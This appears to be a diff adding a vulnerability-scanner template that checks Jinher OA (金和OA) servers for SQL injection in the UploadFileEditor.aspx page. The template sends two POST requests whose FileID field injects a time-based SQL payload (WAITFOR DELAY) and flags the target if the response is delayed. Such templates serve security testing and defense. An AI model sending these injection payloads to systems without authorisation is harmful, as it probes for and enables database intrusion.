@@ -1,0 +1,25 @@
+name: 金和OA-UploadFileEditor-sql
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 5
+matchCount: 2
+rules:
+  - method: POST
+    path: /C6/Control/UploadFileEditor.aspx
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      FileID=1';WAITFOR+DELAY'0:0:4'--+
+    expression:
+      status: 200
+      sleep: 4
+  - method: POST
+    path: /C6/Control/UploadFileEditor.aspx
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      FileID=1';WAITFOR+DELAY'0:0:3'--+
+    expression:
+      status: 200
+      sleep: 3
